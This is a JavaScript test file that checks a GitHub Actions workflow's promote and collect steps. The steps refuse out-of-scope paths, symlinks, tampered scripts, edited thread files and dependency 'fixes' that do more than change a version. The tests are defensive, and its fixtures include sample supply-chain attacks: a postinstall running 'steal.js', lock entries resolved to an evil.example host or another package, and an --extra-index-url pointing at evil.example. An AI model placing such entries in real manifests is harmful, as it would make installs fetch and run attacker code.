// Runs the review-threads path check of pr-run-activity-write.yml's promote
// step (the `script:` of the step with `id: promote`) against fake GitHub
// clients, and the thread-file check of its collect step. A changed path in scope reaches the next gate, the hold-label read,
// which fails here because the case passes no hold labels.
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { createRequire } from "node:module";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, test } from "node:test";

const WORKFLOW = new URL("../../workflows/pr-run-activity-write.yml", import.meta.url);
const SCOPE = new URL("./thread-scope.mjs", import.meta.url);
const HEAD = "a".repeat(40);
const LANE = "b".repeat(40);

function stepScript(step = "promote") {
  const lines = readFileSync(WORKFLOW, "utf8").split("\n");
  const id = lines.findIndex((line) => line.trim() === `id: ${step}`);
  assert.notEqual(id, -1, `the workflow has the ${step} step`);
  const start = lines.findIndex((line, i) => i > id && /^\s+script: \|$/.test(line));
  const keyIndent = lines[start].search(/\S/);
  const body = [];
  for (const line of lines.slice(start + 1)) {
    if (line.trim() !== "" && line.search(/\S/) <= keyIndent) break;
    body.push(line);
  }
  const indent = Math.min(...body.filter((l) => l.trim()).map((l) => l.search(/\S/)));
  return body.map((l) => l.slice(indent)).join("\n");
}

const dir = mkdtempSync(join(tmpdir(), "promote-scope-"));
after(() => rmSync(dir, { recursive: true, force: true }));

// Every lane-tip tree entry is a regular file unless `modes` names it.
// `edit` rewrites the thread file after its SHA-256 is recorded.
async function promote(files, { scope = readFileSync(SCOPE), sha256, threads = [{ path: "plugins/p/evals/c/case.yaml" }, { path: "src/round.py" }], modes = {}, threadsSha256, edit } = {}) {
  const threadFile = join(dir, "threads.json");
  writeFileSync(threadFile, JSON.stringify({ threads }));
  const recorded = threadsSha256 ?? createHash("sha256").update(readFileSync(threadFile)).digest("hex");
  if (edit) writeFileSync(threadFile, edit);
  const scopeScript = join(dir, "thread-scope.mjs");
  writeFileSync(scopeScript, scope);
  const env = {
    HEAD_SHA: HEAD,
    HEAD_REF: "feature",
    LANE_BRANCH: "lane-commits/x",
    MERGE_BASE: "false",
    THREAD_FILE: threadFile,
    SCOPE_SCRIPT: scopeScript,
    SCOPE_SHA256: sha256 ?? createHash("sha256").update(readFileSync(SCOPE)).digest("hex"),
    THREADS_SHA256: recorded,
    DEPENDENCY_REVIEW: "false",
    HOLD_LABELS: "",
  };
  const saved = { ...process.env };
  Object.assign(process.env, env);
  const failed = [];
  const core = { setOutput() {}, info() {}, warning() {}, setFailed: (message) => failed.push(message) };
  const github = {
    request: async () => ({ data: { object: { sha: LANE } } }),
    async graphql(query, { expression }) {
      const dir = expression.slice(`${LANE}:`.length);
      const entries = files
        .map((f) => f.filename)
        .filter((name) => name.slice(0, Math.max(name.lastIndexOf("/"), 0)) === dir)
        .map((name) => ({ name: name.slice(dir ? dir.length + 1 : 0), ...(modes[name] ?? { type: "blob", mode: 0o100644 }) }));
      return { repository: { object: { entries } } };
    },
    rest: {
      repos: { compareCommitsWithBasehead: async () => ({ data: { files } }) },
      git: { deleteRef: async () => {} },
    },
  };
  const context = { repo: { owner: "o", repo: "r" } };
  try {
    const AsyncFunction = (async () => {}).constructor;
    await new AsyncFunction("github", "context", "core", "require", stepScript())(
      github,
      context,
      core,
      createRequire(import.meta.url),
    );
  } finally {
    process.env = saved;
  }
  return failed;
}

const HOLD = /^No hold labels were read/;
const OUT = /^The lane branch changes a path outside the kept threads' scope or under \.github\//;

test("in-scope changes pass the path check: the thread's path, its plugin's files, a sibling test", async () => {
  const failed = await promote([
    { filename: "plugins/p/evals/c/case.yaml" },
    { filename: "plugins/p/evals/c/samples/deep/new.json" },
    { filename: "plugins/p/evals/other/samples/new.json" },
    { filename: "plugins/p/README.md" },
    { filename: "src/test_round.py" },
  ]);
  assert.equal(failed.length, 1);
  assert.match(failed[0], HOLD);
});

for (const file of [
  { filename: "plugins/q/evals/c/samples/new.json" },
  { filename: "src/lib/test_round.py" },
  { filename: ".github/workflows/x.yml" },
  { filename: "plugins/p/evals/c/x.json", previous_filename: ".github/x.yml" },
]) {
  test(`an out-of-scope change stops the move: ${file.previous_filename ?? file.filename}`, async () => {
    const failed = await promote([{ filename: "plugins/p/evals/c/case.yaml" }, file]);
    assert.equal(failed.length, 1);
    assert.match(failed[0], OUT);
  });
}

test("a rewritten scope copy, or no recorded hash, stops the move", async () => {
  const permissive = "export const inThreadScope = () => true;\n";
  for (const options of [{ scope: permissive }, { sha256: "" }]) {
    const failed = await promote([{ filename: ".github/workflows/x.yml" }], options);
    assert.deepEqual(failed, ["thread-scope.mjs does not match the base's copy; the PR branch is not moved"]);
  }
});

test("a file a kept thread's named_paths holds passes the path check; the same file unnamed stops the move", async () => {
  const named = [{ path: "plugins/p/evals/c/case.yaml", named_paths: ["plugins/p/lib/run.js"] }];
  const passed = await promote([{ filename: "plugins/p/lib/run.js" }], { threads: named });
  assert.equal(passed.length, 1);
  assert.match(passed[0], HOLD);
  const stopped = await promote([{ filename: "plugins/p/lib/run.js" }]);
  assert.match(stopped[0], OUT);
  const instruction = await promote([{ filename: "plugins/p/AGENTS.md" }], { threads: [{ ...named[0], named_paths: ["plugins/p/AGENTS.md"] }] });
  assert.match(instruction[0], OUT);
});

test("a symbolic link or gitlink the lane adds at an in-scope path stops the move; a removed file needs no entry", async () => {
  for (const mode of [{ type: "blob", mode: 0o120000 }, { type: "commit", mode: 0o160000 }]) {
    const failed = await promote([{ filename: "plugins/p/hooksx" }], { modes: { "plugins/p/hooksx": mode } });
    assert.deepEqual(failed, ["The lane branch adds or changes a path that is not a regular file (plugins/p/hooksx); the PR branch is not moved"]);
  }
  const removed = await promote([{ filename: "plugins/p/README.md", status: "removed" }], { modes: { "plugins/p/README.md": { type: "missing" } } });
  assert.match(removed[0], HOLD);
});

const WIDENED = JSON.stringify({ threads: [{ path: ".github/workflows/x.yml" }] });
const MOVE_REFUSED = "threads.json does not match the SHA-256 the select step recorded; the PR branch is not moved";

test("a thread file edited after its hash, or no recorded hash, stops the move", async () => {
  for (const options of [{ edit: WIDENED }, { threadsSha256: "" }]) {
    const failed = await promote([{ filename: ".github/workflows/x.yml" }], options);
    assert.deepEqual(failed, [MOVE_REFUSED]);
  }
});

const CLASSIFY = new URL("./dependency-classify.mjs", import.meta.url);

// The base dependabot.yml's [ecosystem, directory] pairs, as the select step
// hands them on: a fixture, not this repository's config.
const PAIRS = [["github-actions", "/"], ["npm", "/"], ["npm", "/plugins/miro/server"], ["npm", "/.github/actions/resolve-config"], ["pip", "/plugins/animation"], ["pip", "/.github"]];

// A plain version bump of x, and of numpy, on each side of the fix.
const pkg = (range, extra = {}) => JSON.stringify({ name: "p", scripts: { test: "node t.js" }, dependencies: { x: range }, ...extra });
const lock = (version, resolved = `https://registry.npmjs.org/x/-/x-${version}.tgz`) =>
  JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/x": { version, resolved, integrity: `sha512-${"A".repeat(86)}==` } } });
const reqs = (version) => `numpy==${version}\n`;
const BEFORE = { "package.json": pkg("^1.0.0"), "package-lock.json": lock("1.0.0"), "requirements.txt": reqs("2.5.3"), "requirements.in": reqs("2.5.3") };
const AFTER = { "package.json": pkg("^2.0.0"), "package-lock.json": lock("2.0.0"), "requirements.txt": reqs("2.5.4"), "requirements.in": reqs("2.5.4") };
const nameOf = (path) => path.slice(path.lastIndexOf("/") + 1);
const modified = (filename) => ({ filename, status: "modified" });

// The dependency-review path of the same step, on a `fix` verdict whose
// commits all carry [dependabot skip]. Every lane-tip entry is a regular file
// unless `modes` names it; `texts` maps `${ref}:${path}` to a file's text,
// else BEFORE at the head and AFTER at the lane tip.
async function promoteFix(files, { classify = readFileSync(CLASSIFY), sha256, pairs = JSON.stringify(PAIRS), modes = {}, texts = {} } = {}) {
  const classifyScript = join(dir, "dependency-classify.mjs");
  writeFileSync(classifyScript, classify);
  const saved = { ...process.env };
  Object.assign(process.env, {
    HEAD_SHA: HEAD,
    HEAD_REF: "dependabot/npm_and_yarn/x",
    LANE_BRANCH: "lane-commits/x",
    MERGE_BASE: "false",
    THREAD_FILE: "",
    DEPENDENCY_REVIEW: "true",
    DEPENDENCY_OUTPUT: JSON.stringify({ verdict: "fix" }),
    CLASSIFY_SCRIPT: classifyScript,
    CLASSIFY_SHA256: sha256 ?? createHash("sha256").update(readFileSync(CLASSIFY)).digest("hex"),
    CONFIG_PAIRS: pairs,
    HOLD_LABELS: "",
  });
  const failed = [];
  const core = { setOutput() {}, info() {}, warning() {}, setFailed: (message) => failed.push(message) };
  const commits = [{ commit: { message: "Fix the dependency update on x [dependabot skip]" } }];
  const github = {
    request: async () => ({ data: { object: { sha: LANE } } }),
    async graphql(query, { expression }) {
      const at = expression.slice(`${LANE}:`.length);
      const entries = files
        .map((f) => f.filename)
        .filter((name) => name.slice(0, Math.max(name.lastIndexOf("/"), 0)) === at)
        .map((name) => ({ name: nameOf(name), ...(modes[name] ?? { type: "blob", mode: 0o100644 }) }));
      return { repository: { object: { entries } } };
    },
    rest: {
      repos: {
        compareCommitsWithBasehead: async () => ({ data: { files, commits } }),
        async getContent({ path, ref, mediaType }) {
          assert.equal(mediaType?.format, "raw");
          const key = `${ref}:${path}`;
          const text = key in texts ? texts[key] : (ref === HEAD ? BEFORE : AFTER)[nameOf(path)];
          if (text === undefined) throw Object.assign(new Error("Not Found"), { status: 404 });
          return { data: text };
        },
      },
      git: { deleteRef: async () => {} },
    },
  };
  try {
    const AsyncFunction = (async () => {}).constructor;
    await new AsyncFunction("github", "context", "core", "require", stepScript())(
      github,
      { repo: { owner: "o", repo: "r" } },
      core,
      createRequire(import.meta.url),
    );
  } finally {
    process.env = saved;
  }
  return failed;
}

const OUT_OF_FIX_SCOPE = /^The lane branch changes a path that is not an npm or pip manifest or lock file outside \.github\//;

test("a dependency fix touching only manifests and lock files reaches the move", async () => {
  for (const files of [
    [modified("package.json"), modified("package-lock.json")],
    [modified("plugins/miro/server/package.json"), modified("plugins/miro/server/package-lock.json")],
    [modified("plugins/animation/requirements.in"), modified("plugins/animation/requirements.txt")],
  ]) {
    const failed = await promoteFix(files);
    assert.equal(failed.length, 1, JSON.stringify(files));
    assert.match(failed[0], HOLD, JSON.stringify(files));
  }
});

for (const file of [
  { filename: "plugins/miro/server/src/index.js" },
  { filename: "package.json", previous_filename: "scripts/build.js" },
  { filename: ".github/workflows/x.yml" },
  { filename: ".github/actions/resolve-config/package.json" },
  { filename: ".github/requirements-ci.txt" },
  { filename: "plugins/animation/setup.py" },
  { filename: "plugins/animation/pyproject.toml" },
  { filename: "plugins/unlisted/package.json" },
  { filename: "plugins/miro/server/sub/package.json" },
]) {
  test(`a dependency fix touching ${file.previous_filename ?? file.filename} does not move the PR branch`, async () => {
    const failed = await promoteFix([{ filename: "package-lock.json" }, file]);
    assert.equal(failed.length, 1);
    assert.match(failed[0], OUT_OF_FIX_SCOPE);
  });
}

test("an unreadable or empty Dependabot config admits no dependency fix", async () => {
  for (const pairs of ["", "null", "[]", "not json"]) {
    const failed = await promoteFix([{ filename: "package.json" }], { pairs });
    assert.equal(failed.length, 1, pairs);
    assert.match(failed[0], OUT_OF_FIX_SCOPE, pairs);
  }
});

test("a rewritten classifier copy, or no recorded hash, stops a dependency fix", async () => {
  const permissive = "export const inFixScope = () => true;\n";
  for (const options of [{ classify: permissive }, { sha256: "" }]) {
    const failed = await promoteFix([{ filename: "src/x.js" }], options);
    assert.deepEqual(failed, ["dependency-classify.mjs does not match the base's copy; the PR branch is not moved"]);
  }
});

const NOT_A_VERSION_CHANGE = /^The lane branch's fix is not a version change of regular manifest files \(/;

test("a dependency fix that makes package.json a symbolic link, submodule or executable does not move the PR branch", async () => {
  for (const entry of [{ type: "blob", mode: 0o120000 }, { type: "commit", mode: 0o160000 }, { type: "blob", mode: 0o100755 }]) {
    const failed = await promoteFix([modified("package.json")], { modes: { "package.json": entry } });
    assert.equal(failed.length, 1, JSON.stringify(entry));
    assert.match(failed[0], NOT_A_VERSION_CHANGE, JSON.stringify(entry));
    assert.match(failed[0], /fix-mode:package\.json/);
  }
});

test("a dependency fix whose content is more than a version change does not move the PR branch", async () => {
  const cases = {
    "a postinstall script": [modified("package.json"), { [`${LANE}:package.json`]: pkg("^2.0.0", { scripts: { test: "node t.js", postinstall: "node steal.js" } }) }],
    "a lock resolved to another host": [modified("package-lock.json"), { [`${LANE}:package-lock.json`]: lock("2.0.0", "https://evil.example/x.tgz") }],
    "a lock repointed at another package": [modified("package-lock.json"), { [`${LANE}:package-lock.json`]: lock("2.0.0", "https://registry.npmjs.org/evilpkg/-/evilpkg-6.6.6.tgz") }],
    "an --extra-index-url line": [modified("plugins/animation/requirements.txt"), { [`${LANE}:plugins/animation/requirements.txt`]: `--extra-index-url https://evil.example/simple\n${reqs("2.5.4")}` }],
    "an added file": [{ filename: "package-lock.json", status: "added" }, {}],
  };
  for (const [why, [file, texts]] of Object.entries(cases)) {
    const failed = await promoteFix([file], { texts });
    assert.equal(failed.length, 1, why);
    assert.match(failed[0], NOT_A_VERSION_CHANGE, why);
  }
});

async function collect({ edit, threadsSha256 } = {}) {
  const threadFile = join(dir, "collect-threads.json");
  writeFileSync(threadFile, JSON.stringify({ threads: [{ id: "T1", path: "src/round.py", comments: [{ id: 1 }] }] }));
  const recorded = threadsSha256 ?? createHash("sha256").update(readFileSync(threadFile)).digest("hex");
  if (edit) writeFileSync(threadFile, edit);
  const outDir = join(dir, "collect-out");
  const saved = { ...process.env };
  Object.assign(process.env, {
    HEAD_SHA: HEAD,
    THREAD_FILE: threadFile,
    THREADS_SHA256: recorded,
    REPLIES_FILE: join(dir, "absent-replies.jsonl"),
    OUT_DIR: outDir,
  });
  const failed = [];
  const core = { setOutput() {}, info() {}, setFailed: (message) => failed.push(message) };
  try {
    const AsyncFunction = (async () => {}).constructor;
    await new AsyncFunction("core", "require", stepScript("feedback-collect"))(core, createRequire(import.meta.url));
  } finally {
    process.env = saved;
  }
  return { failed, outDir };
}

test("the collect step writes run.json from an unedited thread file", async () => {
  const { failed, outDir } = await collect();
  assert.deepEqual(failed, []);
  assert.deepEqual(JSON.parse(readFileSync(join(outDir, "run.json"), "utf8")).threads, [
    { id: "T1", path: "src/round.py", comment_ids: [1] },
  ]);
});

test("a thread file edited after its hash, or no recorded hash, writes no run.json", async () => {
  for (const options of [{ edit: WIDENED.replace('"path"', '"id":"T9","comments":[],"path"') }, { threadsSha256: "" }]) {
    const { failed, outDir } = await collect(options);
    assert.deepEqual(failed, ["threads.json does not match the SHA-256 the select step recorded; no replies are collected"]);
    assert.equal(existsSync(join(outDir, "run.json")), false);
  }
});
